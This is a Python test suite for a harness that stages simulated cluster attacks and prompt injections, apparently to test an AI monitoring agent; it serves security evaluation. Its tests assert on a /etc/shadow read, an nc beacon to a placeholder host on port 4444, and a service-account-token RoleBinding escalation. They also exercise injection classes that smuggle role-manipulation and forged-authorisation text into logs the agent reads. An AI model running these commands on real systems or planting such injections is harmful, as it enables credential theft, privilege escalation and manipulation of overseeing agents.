"""Offline contract tests for the scenario applier's cluster-facing boundary."""

from __future__ import annotations

import copy
import datetime as dt
import json
import subprocess
from collections.abc import Mapping, Sequence
from pathlib import Path
from typing import Any

import pytest

from scenarios.attackers import apply as applier
from scenarios.attackers import content
from scenarios.attackers import plan as planner
from scenarios.attackers.apply import (
    ApplyError,
    DirectoryInjectionChannels,
    KubectlClusterAdapter,
    OfflineAdapter,
    apply_plan,
    main,
    publish_log,
    read_plan,
    validate_plan,
)
from scenarios.attackers.marker import mark_payload, payload_marker

SCENARIO = "SCN-SIM-01"
RUN_ID = "RUN-G0-FULL-SCN-SIM-01-INJ-A-101"


class FakeClock:
    def __init__(self) -> None:
        self.elapsed = 0.0
        self.sleeps: list[float] = []

    def monotonic(self) -> float:
        return self.elapsed

    def sleep(self, seconds: float) -> None:
        self.sleeps.append(seconds)
        self.elapsed += seconds


class RecordingAdapter:
    def __init__(self, *, fail_at: int | None = None, fail_teardown: bool = False) -> None:
        self.calls: list[tuple[Mapping[str, Any], str | None]] = []
        self.teardowns: list[tuple[Mapping[str, Any], str]] = []
        self.fail_at = fail_at
        self.fail_teardown = fail_teardown

    def begin(self, run_id: str) -> None:
        del run_id

    def prepare(
        self, events: Sequence[Mapping[str, Any]], manifest: Mapping[str, Any], run_id: str
    ) -> None:
        del events, manifest, run_id

    def apply_event(self, event: Mapping[str, Any], payload_text: str | None) -> str:
        self.calls.append((event, payload_text))
        if self.fail_at == len(self.calls) - 1:
            raise RuntimeError("command failed")
        return f"executed {event['primitive_id']}"

    def settle(self) -> None:
        pass

    def teardown(self, manifest: Mapping[str, Any], run_id: str) -> None:
        self.teardowns.append((manifest, run_id))
        if self.fail_teardown:
            raise RuntimeError("cleanup failed")


def _wall_clock() -> dt.datetime:
    return dt.datetime(2026, 1, 2, 3, 4, 5, tzinfo=dt.UTC)


def _plan(condition: str = "INJ-A") -> tuple[dict[str, Any], ...]:
    return planner.plan_cell(SCENARIO, condition, 101)


def test_selected_payload_text_is_resolved_and_delivered_but_not_logged() -> None:
    events = _plan()
    adapter = RecordingAdapter()
    clock = FakeClock()
    result = apply_plan(
        events,
        RUN_ID,
        adapter=adapter,
        sleeper=clock.sleep,
        monotonic=clock.monotonic,
        wall_clock=_wall_clock,
    )
    injection = next((event, text) for event, text in adapter.calls if event["kind"] == "injection")
    event, delivered = injection
    expected = content.resolve_payload(event["detail"]["content_pool"], event["payload_id"])
    assert delivered == expected.text
    assert expected.text not in json.dumps(result.records)
    assert result.succeeded


def test_offsets_are_absolute_from_one_t0_not_cumulative() -> None:
    events = _plan("INJ-NONE")
    clock = FakeClock()
    result = apply_plan(
        events,
        "RUN-G0-FULL-SCN-SIM-01-INJ-NONE-101",
        adapter=RecordingAdapter(),
        sleeper=clock.sleep,
        monotonic=clock.monotonic,
        wall_clock=_wall_clock,
    )
    expected = []
    elapsed = 0.0
    for event in events:
        delay = event["offset_ms"] / 1000 - elapsed
        expected.append(delay)
        elapsed += delay
    assert clock.sleeps == pytest.approx(expected)
    assert len(result.records) == len(events)


def test_whole_plan_coordinate_mismatch_is_rejected_before_adapter_use() -> None:
    events = list(copy.deepcopy(_plan()))
    events[1]["seed"] = 102
    with pytest.raises(ApplyError, match="coordinates"):
        validate_plan(events)


@pytest.mark.parametrize(
    "run_id",
    [
        "RUN-G0-FULL-SCN-SIM-02-INJ-A-101",
        "RUN-G0-FULL-SCN-SIM-01-INJ-B-101",
        "RUN-G0-FULL-SCN-SIM-01-INJ-A-102",
        "not-a-run-id",
    ],
)
def test_run_id_must_be_canonical_and_match_every_plan_coordinate(run_id: str) -> None:
    adapter = RecordingAdapter()
    with pytest.raises(ApplyError):
        apply_plan(_plan(), run_id, adapter=adapter)
    assert adapter.calls == []
    assert adapter.teardowns == []


def test_teardown_runs_after_success() -> None:
    adapter = RecordingAdapter()
    result = apply_plan(
        _plan(),
        RUN_ID,
        adapter=adapter,
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
    )
    assert result.succeeded
    assert len(adapter.teardowns) == 1
    assert adapter.teardowns[0][1] == RUN_ID


def test_failure_is_logged_remaining_events_are_skipped_and_teardown_still_runs() -> None:
    events = _plan()
    adapter = RecordingAdapter(fail_at=1)
    result = apply_plan(
        events,
        RUN_ID,
        adapter=adapter,
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
    )
    assert not result.succeeded
    assert len(result.records) == len(events)
    assert result.records[1]["applied"]["outcome"] == "failed"
    assert all(record["applied"]["outcome"] == "skipped" for record in result.records[2:])
    assert len(adapter.calls) == 2
    assert len(adapter.teardowns) == 1


def test_teardown_failure_is_reported_without_losing_application_records() -> None:
    events = _plan()
    adapter = RecordingAdapter(fail_teardown=True)
    result = apply_plan(
        events,
        RUN_ID,
        adapter=adapter,
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
    )
    assert result.error == "teardown failed: RuntimeError: cleanup failed"
    assert len(result.records) == len(events)


def test_offline_adapter_marks_every_event_skipped_and_still_tears_down() -> None:
    result = apply_plan(
        _plan(),
        RUN_ID,
        adapter=OfflineAdapter(),
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
    )
    assert result.succeeded
    assert all(record["applied"]["outcome"] == "skipped" for record in result.records)


def test_publish_log_atomically_replaces_existing_file(tmp_path: Path) -> None:
    path = tmp_path / "injection.log.jsonl"
    path.write_bytes(b"old\n")
    events = _plan()
    result = apply_plan(
        events,
        RUN_ID,
        adapter=OfflineAdapter(),
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
    )
    publish_log(result.records, path)
    assert path.read_bytes() == b"".join(planner.canonical_json_line(r) for r in result.records)
    assert list(tmp_path.glob(".injection.log.jsonl.*")) == []


def test_read_plan_rejects_duplicate_id_and_bad_order(tmp_path: Path) -> None:
    events = list(copy.deepcopy(_plan()))
    events[1]["event_id"] = events[0]["event_id"]
    path = tmp_path / "plan.jsonl"
    path.write_bytes(b"".join(planner.canonical_json_line(event) for event in events))
    with pytest.raises(ApplyError, match="repeats event_id"):
        read_plan(path)


def test_naive_wall_clock_is_rejected_but_teardown_still_runs() -> None:
    adapter = RecordingAdapter()
    with pytest.raises(ApplyError, match="timezone-aware"):
        apply_plan(
            _plan(),
            RUN_ID,
            adapter=adapter,
            sleeper=lambda _: None,
            monotonic=lambda: 1_000_000.0,
            wall_clock=lambda: dt.datetime(2026, 1, 1),
        )
    assert len(adapter.teardowns) == 1


class FakeProcessRunner:
    def __init__(self, context: str = "kind-overwatch") -> None:
        self.context = context
        self.calls: list[tuple[tuple[str, ...], str | None]] = []
        self.fail_on: str | None = None
        # Returned for a `get pods` listing. Deliberately unsorted, so a test asserting replica
        # selection is asserting that the applier sorts before indexing (ADR-059 decision 5, D13)
        # rather than trusting the API's return order.
        self.pod_names: list[str] = ["pod-c", "pod-a", "pod-b"]
        # Returned for the clean-start `get networkpolicies -o name` listing (ADR-081). Empty is the
        # baseline; a test plants a name to model an earlier run's policy left in the namespace.
        self.network_policies: list[str] = []
        self.deployment_replicas: dict[str, str] = {
            "adservice": "3",
            "cartservice": "3",
            "checkoutservice": "3",
            "frontend": "2",
            "paymentservice": "3",
            "productcatalogservice": "3",
        }

    def __call__(
        self, argv: Sequence[str], input_text: str | None
    ) -> subprocess.CompletedProcess[str]:
        command = tuple(argv)
        self.calls.append((command, input_text))
        if command[-2:] == ("config", "current-context"):
            return subprocess.CompletedProcess(command, 0, self.context + "\n", "")
        if self.fail_on is not None and self.fail_on in command:
            return subprocess.CompletedProcess(command, 9, "", "injected failure")
        if "get" in command and "networkpolicies" in command:
            listing = "".join(
                f"networkpolicy.networking.k8s.io/{name}\n" for name in self.network_policies
            )
            return subprocess.CompletedProcess(command, 0, listing, "")
        deployment = next(
            (part.split("/", 1)[1] for part in command if part.startswith("deployment/")), None
        )
        if "get" in command and deployment is not None and "jsonpath={.spec.replicas}" in command:
            return subprocess.CompletedProcess(command, 0, self.deployment_replicas[deployment], "")
        if "rollout" in command and "status" in command and "--timeout=120s" in command:
            return subprocess.CompletedProcess(
                command, 0, "deployment successfully rolled out\n", ""
            )
        if "get" in command and "pods" in command:
            return subprocess.CompletedProcess(command, 0, " ".join(self.pod_names), "")
        return subprocess.CompletedProcess(command, 0, "ok\n", "")


class HttpStatusRunner(FakeProcessRunner):
    def __call__(
        self, argv: Sequence[str], input_text: str | None
    ) -> subprocess.CompletedProcess[str]:
        result = super().__call__(argv, input_text)
        command = tuple(argv)
        if "debug" in command and "code=$(curl" in command[-1]:
            return subprocess.CompletedProcess(command, 9, "", "unexpected HTTP status")
        return result


class FakePtyRunner:
    """A pty runner that records into a shared calls list and can be told to fail a call."""

    def __init__(self, calls: list[tuple[tuple[str, ...], str | None]]) -> None:
        self._calls = calls
        self.fail_on: str | None = None

    def __call__(self, argv: Sequence[str]) -> subprocess.CompletedProcess[str]:
        command = tuple(argv)
        self._calls.append((command, None))
        if self.fail_on is not None and self.fail_on in command:
            return subprocess.CompletedProcess(command, 9, "", "injected failure")
        return subprocess.CompletedProcess(command, 0, "", "")


def _calls_beyond_guards(runner: FakeProcessRunner) -> list[tuple[str, ...]]:
    """Calls other than read-only run-boundary guards (ADR-081, ADR-098)."""
    return [
        argv
        for argv, _ in runner.calls
        if argv[-2:] != ("config", "current-context")
        and not ("get" in argv and "networkpolicies" in argv)
        and "jsonpath={.spec.replicas}" not in argv
        and not ("rollout" in argv and "status" in argv and "--timeout=120s" in argv)
    ]


def _kubectl_adapter(
    tmp_path: Path,
    runner: FakeProcessRunner,
    *,
    channels: DirectoryInjectionChannels | None = None,
    pty_runner: FakePtyRunner | None = None,
) -> KubectlClusterAdapter:
    config = tmp_path / "config"
    config.write_text("apiVersion: v1\n", encoding="utf-8")
    if pty_runner is None:
        pty_runner = FakePtyRunner(runner.calls)
    return KubectlClusterAdapter(
        kubeconfig=config,
        context="kind-overwatch",
        cluster_cli="cluster-cli-test",
        runner=runner,
        pty_runner=pty_runner,
        injection_channels=channels,
        cleanup_wait_seconds=0,
        cleanup_sleeper=lambda _: None,
    )


def test_kubectl_adapter_refuses_context_mismatch_before_mutation(tmp_path: Path) -> None:
    runner = FakeProcessRunner(context="production")
    adapter = _kubectl_adapter(tmp_path, runner)
    with pytest.raises(ApplyError, match="refusing cluster mutation"):
        adapter.begin(RUN_ID)
    assert len(runner.calls) == 1
    assert runner.calls[0][0][-2:] == ("config", "current-context")


def test_kubectl_adapter_uses_argv_and_explicit_context_for_chaos(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = next(event for event in _plan("INJ-NONE") if event["mechanism"] == "chaosmesh")
    adapter.begin("RUN-G0-FULL-SCN-SIM-01-INJ-NONE-101")
    detail = adapter.apply_event(event, None)
    argv, input_text = runner.calls[-1]
    assert argv[:5] == (
        "cluster-cli-test",
        "--kubeconfig",
        str((tmp_path / "config").resolve()),
        "--context",
        "kind-overwatch",
    )
    assert argv[-3:] == ("apply", "-f", "-")
    assert input_text is not None
    document = json.loads(input_text)
    assert document["metadata"]["labels"]["agentic-overwatch.io/scenario-id"] == SCENARIO
    assert "NetworkChaos" in detail


@pytest.mark.parametrize(
    ("injection_class", "attribute"),
    (
        ("INJ-A", "prompt_input"),
        ("INJ-C", "role_manipulation"),
        ("INJ-D", "parameter_manipulation"),
    ),
)
def test_kubectl_adapter_delivers_runner_inputs_as_exact_bytes_with_labels(
    tmp_path: Path, injection_class: str, attribute: str
) -> None:
    runner = FakeProcessRunner()
    paths = {
        "prompt_input": tmp_path / "channels" / "prompt.txt",
        "role_manipulation": tmp_path / "channels" / "role.txt",
        "parameter_manipulation": tmp_path / "channels" / "parameter.txt",
    }
    paths[attribute].parent.mkdir()
    channels = DirectoryInjectionChannels(**paths)
    adapter = _kubectl_adapter(tmp_path, runner, channels=channels)
    event = next(event for event in _plan(injection_class) if event["kind"] == "injection")
    payload = "quoted ' payload; $(never-a-shell)\nsecond line\N{SNOWMAN}"
    adapter.begin(f"RUN-G0-FULL-SCN-SIM-01-{injection_class}-101")
    adapter.apply_event(event, payload)
    # The channel file is the registry bytes plus this cell's F-SC-01 marker, and nothing else.
    marker = payload_marker(SCENARIO, injection_class, 101)
    assert paths[attribute].read_bytes() == mark_payload(payload, marker).encode("utf-8")
    metadata = json.loads(paths[attribute].with_suffix(".txt.json").read_text(encoding="utf-8"))
    assert metadata["injection_class"] == injection_class
    assert metadata["payload_id"] == event["payload_id"]
    assert metadata["scenario_id"] == SCENARIO
    assert metadata["labels"] == {
        "agentic-overwatch.io/scenario-id": SCENARIO,
        "agentic-overwatch.io/run-id": f"RUN-G0-FULL-SCN-SIM-01-{injection_class}-101",
    }
    assert metadata["surface"] == event["detail"]["surface"]
    assert _calls_beyond_guards(runner) == []  # no generic ConfigMap mutation


def _debug_commands(runner: FakeProcessRunner) -> list[tuple[str, ...]]:
    return [argv for argv, _ in runner.calls if "debug" in argv]


def _debug_payload_argv(argv: tuple[str, ...]) -> tuple[str, ...]:
    """What follows ``--`` in a cluster-CLI ``debug`` call: the command the debug container runs."""
    return argv[argv.index("--") + 1 :]


def test_kubectl_adapter_delivers_ingested_log_as_a_terminal_shell_command_line(
    tmp_path: Path,
) -> None:
    """INJ-B lands in Falco's proc.cmdline, not on a Pod nothing reads (ADR-119, ADR-105).

    One debug container with a terminal on the seeded target replica, running ``sh -c :`` with the
    payload as inert positional parameters: the shape the "Terminal shell in container" rule fires
    on and renders into ``proc_cmdline``. No Pod is created, nothing is waited on, and the payload
    never passes through a host shell.
    """
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = next(event for event in _plan("INJ-B") if event["kind"] == "injection")
    payload = "quoted ' payload; $(never-a-shell)\nsecond line"
    adapter.begin("RUN-G0-FULL-SCN-SIM-01-INJ-B-101")
    detail = adapter.apply_event(event, payload)

    (debug,) = _debug_commands(runner)
    assert "-it" in debug, "the terminal-shell rule needs proc.tty != 0"
    assert debug[debug.index("--target") + 1] == event["target"]["container"]
    replica = sorted(runner.pod_names)[event["target"]["replica_index"]]
    assert debug[debug.index("debug") + 2] == replica
    # The payload rides behind `sh -c :`, with this cell's F-SC-01 marker appended (ADR-154).
    marker = payload_marker("SCN-SIM-01", "INJ-B", 101)
    assert _debug_payload_argv(debug) == ("sh", "-c", ":", mark_payload(payload, marker))
    assert applier.ingested_log_cmdline(payload) == "sh -c : " + payload
    assert not any(argv[-3:] == ("apply", "-f", "-") for argv, _ in runner.calls)
    assert not any("wait" in argv for argv, _ in runner.calls)
    assert event["payload_id"] in detail


def test_ingested_log_argv_turns_each_nul_into_an_argument_boundary() -> None:
    """A NUL cannot sit inside an argument; it becomes a boundary Falco renders as a space.

    ADR-105 moved INJ-B-pool-01-006 off the environment because runc refused its NUL. An argv
    cannot carry one either, so the padding becomes argument boundaries -- the kernel's own
    representation of a command line -- and the recorded cmdline keeps one space per NUL rather
    than dropping the padding the forged-authorisation shape depends on.
    """
    payload = "first\n\x00\x00\x00second"
    argv = applier.ingested_log_argv(payload)
    assert argv == ("sh", "-c", ":", "first\n", "", "", "second")
    assert all("\x00" not in part for part in argv)
    assert applier.ingested_log_cmdline(payload) == "sh -c : first\n   second"


def test_kubectl_adapter_fails_the_ingested_log_delivery_when_the_debug_shell_fails(
    tmp_path: Path,
) -> None:
    """A delivery that did not run is an error, never an ``applied`` record (ADR-105's defect)."""
    runner = FakeProcessRunner()
    pty_runner = FakePtyRunner(runner.calls)
    pty_runner.fail_on = "debug"
    adapter = _kubectl_adapter(tmp_path, runner, pty_runner=pty_runner)
    event = next(event for event in _plan("INJ-B") if event["kind"] == "injection")
    adapter.begin("RUN-G0-FULL-SCN-SIM-01-INJ-B-101")
    with pytest.raises(ApplyError, match="debug ephemeral container"):
        adapter.apply_event(event, "payload")


_SCENARIO_IDS = sorted(
    path.stem for path in (applier.REPO_ROOT / "scenarios" / "manifests").glob("SCN-*.yaml")
)


@pytest.mark.parametrize("scenario_id", _SCENARIO_IDS)
def test_every_ingested_log_pool_instance_reaches_the_declared_cmdline(
    tmp_path: Path, scenario_id: str
) -> None:
    """Every INJ-B instance, in every scenario, is delivered and recorded whole (ADR-119).

    The corpus guard ADR-105 added, moved onto the new path: each instance of each INJ-B pool is
    driven through the real applier for each scenario, and must reach the debug shell's argv with
    no NUL inside any argument and with the recorded cmdline holding the whole payload.
    """
    pool_dir = applier.REPO_ROOT / "scenarios" / "attackers" / "content"
    pools = sorted(pool_dir.glob("INJ-B-pool-*.json"))
    assert pools, "no INJ-B content pool found"
    run_id = f"RUN-G0-FULL-{scenario_id}-INJ-B-101"
    event = next(
        event
        for event in planner.plan_cell(scenario_id, "INJ-B", 101)
        if event["kind"] == "injection"
    )
    assert "proc.cmdline" in event["detail"]["surface"]
    marker = payload_marker(scenario_id, "INJ-B", 101)
    for pool_path in pools:
        instances = json.loads(pool_path.read_text(encoding="utf-8"))["instances"]
        for instance in instances:
            runner = FakeProcessRunner()
            adapter = _kubectl_adapter(tmp_path, runner)
            adapter.begin(run_id)
            adapter.apply_event(event, instance["text"])
            (debug,) = _debug_commands(runner)
            command = _debug_payload_argv(debug)
            label = f"{scenario_id} {pool_path.name}/{instance['payload_id']}"
            assert all("\x00" not in part for part in command), label
            marked = mark_payload(instance["text"], marker)
            assert command == applier.ingested_log_argv(marked), label
            assert marker in applier.ingested_log_cmdline(marked), label
            assert instance["text"].replace("\x00", " ") in applier.ingested_log_cmdline(marked), (
                label
            )


def test_cve_prepare_calls_the_repository_preflight_script(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    scenario_id = "SCN-CVE-05"
    run_id = _run_id(scenario_id)
    adapter.begin(run_id)
    adapter.prepare((), planner.load_manifest(scenario_id), run_id)

    argv, input_text = runner.calls[-1]
    assert argv == (
        "sh",
        str(applier.REPO_ROOT / "scripts" / "cve_admission_preflight.sh"),
        scenario_id,
    )
    assert input_text is None


def test_kubectl_adapter_fails_closed_when_declared_runner_surface_is_unavailable(
    tmp_path: Path,
) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = next(event for event in _plan("INJ-D") if event["kind"] == "injection")
    adapter.begin("RUN-G0-FULL-SCN-SIM-01-INJ-D-101")
    with pytest.raises(ApplyError, match="channels unavailable for INJ-D"):
        adapter.apply_event(event, "payload")
    assert _calls_beyond_guards(runner) == []


def test_kubectl_adapter_rejects_unpinned_cve_without_set_image(
    tmp_path: Path, monkeypatch: Any
) -> None:
    # The corpus is supplied here rather than read from scenarios/cve/images.yaml, which carried
    # empty digests only until Tier B pinned them. The assertion is unchanged -- an entry whose
    # digest is empty must be refused before any image-set command -- but it is now asserted
    # against a corpus the test owns, so pinning the real file cannot make this test vacuous or
    # red. Its sibling below covers the pinned path the same way.
    registry = tmp_path / "images-unpinned.yaml"
    registry.write_text(
        "images:\n"
        "  - id: CVE-SCN-04-productcatalogservice\n"
        "    scenario_id: SCN-CVE-04\n"
        "    repository: registry.example/catalog\n"
        '    digest: ""\n',
        encoding="utf-8",
    )
    monkeypatch.setattr(applier, "CVE_IMAGES_FILE", registry)
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = next(event for event in planner.plan_cell("SCN-CVE-04", "INJ-NONE", 101))
    assert event["mechanism"] == "cve"
    adapter.begin("RUN-G0-FULL-SCN-CVE-04-INJ-NONE-101")
    with pytest.raises(ApplyError, match="unpinned"):
        adapter.apply_event(event, None)
    assert all("set" not in argv for argv, _ in runner.calls)


def test_kubectl_adapter_swaps_the_target_container_to_the_pinned_vulnerable_image(
    tmp_path: Path, monkeypatch: Any
) -> None:
    # ADR-091: the CVE arm rebuilds the real service image (adservice's own `server` container),
    # not a `cve-lab` sidecar -- so the swap replaces the container's image in place, keeping the
    # gRPC contract and its :9555 probes, with imagePullPolicy Never and no command override.
    registry = tmp_path / "images.yaml"
    digest = "sha256:" + "a" * 64
    registry.write_text(
        "images:\n"
        "  - id: CVE-SCN-04-adservice\n"
        "    scenario_id: SCN-CVE-04\n"
        "    repository: registry.example/adservice-log4shell\n"
        f'    digest: "{digest}"\n'
        "    container: server\n",
        encoding="utf-8",
    )
    monkeypatch.setattr(applier, "CVE_IMAGES_FILE", registry)
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = next(event for event in planner.plan_cell("SCN-CVE-04", "INJ-NONE", 101))
    adapter.begin("RUN-G0-FULL-SCN-CVE-04-INJ-NONE-101")
    adapter.apply_event(event, None)
    patch_argv, _ = next((argv, data) for argv, data in runner.calls if "patch" in argv)
    patch = json.loads(patch_argv[patch_argv.index("-p") + 1])
    containers = patch["spec"]["template"]["spec"]["containers"]
    assert containers == [
        {
            "name": "server",
            "image": f"registry.example/adservice-log4shell@{digest}",
            "imagePullPolicy": "Never",
        }
    ]
    assert any("rollout" in argv for argv, _ in runner.calls)


SHADOW_PATH = "/etc/shadow"
SA_MOUNT = "/var/run/secrets/kubernetes.io/serviceaccount/token"


def _attacker_event(
    scenario: str, primitive_id: str, condition: str = "INJ-NONE", seed: int = 101
) -> dict[str, Any]:
    return next(
        event
        for event in planner.plan_cell(scenario, condition, seed)
        if event["mechanism"] == "attacker" and event["primitive_id"] == primitive_id
    )


def _run_id(scenario: str, condition: str = "INJ-NONE", seed: int = 101) -> str:
    return f"RUN-G0-FULL-{scenario}-{condition}-{seed}"


def _debug_call(runner: FakeProcessRunner) -> tuple[str, ...]:
    return next(argv for argv, _ in runner.calls if "debug" in argv)


def _exec_call(runner: FakeProcessRunner) -> tuple[tuple[str, ...], str | None]:
    return next((argv, stdin) for argv, stdin in runner.calls if "exec" in argv)


def _pod_listing(runner: FakeProcessRunner) -> tuple[str, ...]:
    return next(argv for argv, _ in runner.calls if "get" in argv and "pods" in argv)


def _flag_value(argv: tuple[str, ...], flag: str) -> str:
    return argv[argv.index(flag) + 1]


def test_container_shell_runs_a_pty_shell_in_a_debug_container_on_the_selected_replica(
    tmp_path: Path,
) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = _attacker_event("SCN-SIM-01", "container-shell")
    adapter.begin(_run_id("SCN-SIM-01"))
    detail = adapter.apply_event(event, None)

    listing = _pod_listing(runner)
    assert "-l" in listing and "app=cartservice" in listing
    debug_argv = _debug_call(runner)
    selected = sorted(runner.pod_names)[event["target"]["replica_index"]]
    assert selected in debug_argv
    assert "-it" in debug_argv
    # the debug image is the single-homed constant, not a literal in the test.
    assert _flag_value(debug_argv, "--image") == applier._DEBUG_SHELL_IMAGE
    assert _flag_value(debug_argv, "--target") == "server"
    assert "--profile" not in debug_argv  # namespaces have no PSA enforce label; default profile
    assert debug_argv[-2:] == ("sh", "-i")
    assert not any("restart" in argv for argv, _ in runner.calls)
    assert "debug container" in detail


def test_attacker_primitive_selects_the_replica_by_sorted_name_then_index(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    runner.pod_names = ["cartservice-z", "cartservice-a", "cartservice-m"]
    adapter = _kubectl_adapter(tmp_path, runner)
    event = _attacker_event("SCN-SIM-01", "sensitive-file-read")
    adapter.begin(_run_id("SCN-SIM-01"))
    adapter.apply_event(event, None)

    debug_argv = _debug_call(runner)
    index = event["target"]["replica_index"]
    # The applier sorts by name before indexing; it does not trust the runner's return order.
    assert ["cartservice-a", "cartservice-m", "cartservice-z"][index] in debug_argv


def test_attacker_primitive_fails_loudly_when_replica_index_is_out_of_range(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    runner.pod_names = ["cartservice-a", "cartservice-b"]  # two live replicas
    adapter = _kubectl_adapter(tmp_path, runner)
    event = copy.deepcopy(_attacker_event("SCN-SIM-01", "container-shell"))
    event["target"]["replica_index"] = 5
    adapter.begin(_run_id("SCN-SIM-01"))
    with pytest.raises(ApplyError, match="out of range"):
        adapter.apply_event(event, None)
    assert not any("debug" in argv for argv, _ in runner.calls)


def test_sensitive_file_read_cats_a_mounted_credential_path_via_debug(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = _attacker_event("SCN-SIM-01", "sensitive-file-read")
    adapter.begin(_run_id("SCN-SIM-01"))
    adapter.apply_event(event, None)

    debug_argv = _debug_call(runner)
    assert "-it" not in debug_argv
    assert _flag_value(debug_argv, "--target") == "server"
    # /etc/shadow, present in the debug image and in overwatch_sensitive_paths; the target's token
    # mount is not visible across the unshared mount namespace.
    assert debug_argv[-2:] == ("cat", SHADOW_PATH)


def test_library_exploit_read_reads_the_same_credential_path_in_adservice(
    tmp_path: Path,
) -> None:
    # ADR-091: SCN-CVE-05 retargeted from paymentservice to adservice (the real Log4Shell host,
    # reached over the frontend->adservice GetAds edge); the primitive shape is unchanged.
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = _attacker_event("SCN-CVE-05", "library-exploit-read")
    adapter.begin(_run_id("SCN-CVE-05"))
    adapter.apply_event(event, None)

    assert "app=adservice" in _pod_listing(runner)
    debug_argv = _debug_call(runner)
    assert debug_argv[-2:] == ("cat", SHADOW_PATH)


def test_egress_beacon_connects_to_the_fixture_documentation_range_host(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = _attacker_event("SCN-SIM-01", "egress-beacon")
    adapter.begin(_run_id("SCN-SIM-01"))
    detail = adapter.apply_event(event, None)

    debug_argv = _debug_call(runner)
    assert "-it" not in debug_argv
    assert debug_argv[-5:] == ("nc", "-w", "1", "203.0.113.77", "4444")
    assert "203.0.113.77:4444" in detail


def test_api_mediated_shell_execs_sh_over_the_api_and_does_not_use_debug(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    pty = FakePtyRunner(runner.calls)
    pty.fail_on = "exec"  # even with no shell in the image, the pods/exec audit has already fired
    adapter = _kubectl_adapter(tmp_path, runner, pty_runner=pty)
    event = _attacker_event("SCN-SIM-02", "api-mediated-shell")
    adapter.begin(_run_id("SCN-SIM-02"))
    detail = adapter.apply_event(event, None)  # must not raise on the non-zero remote exit

    assert "app=productcatalogservice" in _pod_listing(runner)
    exec_argv, _ = _exec_call(runner)
    assert "-it" in exec_argv
    assert exec_argv[-2:] == ("--", "sh")  # command=sh, as the audit fixture records
    assert not any("debug" in argv for argv, _ in runner.calls)
    assert "remote exit 9" in detail


def test_sa_token_escalation_prepares_and_posts_a_namespaced_rolebinding(
    tmp_path: Path,
) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    events = planner.plan_cell("SCN-SIM-02", "INJ-NONE", 101)
    event = next(event for event in events if event["primitive_id"] == "sa-token-escalation")
    manifest = planner.load_manifest("SCN-SIM-02")
    run_id = _run_id("SCN-SIM-02")
    adapter.begin(run_id)
    adapter.prepare(events, manifest, run_id)
    adapter.apply_event(event, None)

    selected = sorted(runner.pod_names)[event["target"]["replica_index"]]
    assert any(
        "label" in argv
        and "pod" in argv
        and selected in argv
        and "agentic-overwatch.io/compromised=true" in argv
        and f"agentic-overwatch.io/run-id={run_id}" in argv
        for argv, _ in runner.calls
    )
    prepared = [
        json.loads(data)
        for argv, data in runner.calls
        if argv[-3:] == ("apply", "-f", "-") and data is not None
    ]
    assert [(item["kind"], item["metadata"]["name"]) for item in prepared] == [
        ("Role", "boutique-escalation"),
        ("Role", "boutique-escalation-precondition"),
        ("RoleBinding", "boutique-escalation-precondition"),
    ]
    assert prepared[1]["rules"][1] == {
        "apiGroups": ["rbac.authorization.k8s.io"],
        "resources": ["roles"],
        "resourceNames": ["boutique-escalation"],
        "verbs": ["bind"],
    }

    debug_argv = _debug_call(runner)
    script = debug_argv[-1]
    assert SA_MOUNT in script and "Bearer $token" in script
    assert "/namespaces/boutique/rolebindings" in script
    assert '[ "$code" = 201 ]' in script
    body = json.loads(script.split("--data-binary '", 1)[1].split("'", 1)[0])
    assert body["kind"] == "RoleBinding"
    assert body["metadata"]["name"] == "boutique-escalation"
    assert body["roleRef"] == {
        "apiGroup": "rbac.authorization.k8s.io",
        "kind": "Role",
        "name": "boutique-escalation",
    }
    assert body["subjects"] == [
        {"kind": "ServiceAccount", "name": "frontend", "namespace": "boutique"}
    ]


def test_sa_http_status_failure_fails_the_primitive(tmp_path: Path) -> None:
    runner = HttpStatusRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = _attacker_event("SCN-SIM-02", "sa-token-escalation")
    adapter.begin(_run_id("SCN-SIM-02"))
    with pytest.raises(ApplyError, match="unexpected HTTP status"):
        adapter.apply_event(event, None)


def test_failed_escalation_stops_the_plan_and_runs_teardown(tmp_path: Path) -> None:
    runner = HttpStatusRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    events = planner.plan_cell("SCN-SIM-02", "INJ-NONE", 101)
    result = apply_plan(
        events,
        _run_id("SCN-SIM-02"),
        adapter=adapter,
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
    )
    assert not result.succeeded
    assert result.records[0]["applied"]["outcome"] == "failed"
    assert all(record["applied"]["outcome"] == "skipped" for record in result.records[1:])
    assert any(
        "delete" in argv and any("rolebinding" in argument for argument in argv)
        for argv, _ in runner.calls
    )


def test_secret_enumeration_lists_namespace_secrets_from_a_debug_container(
    tmp_path: Path,
) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = _attacker_event("SCN-SIM-02", "secret-enumeration")
    adapter.begin(_run_id("SCN-SIM-02"))
    adapter.apply_event(event, None)

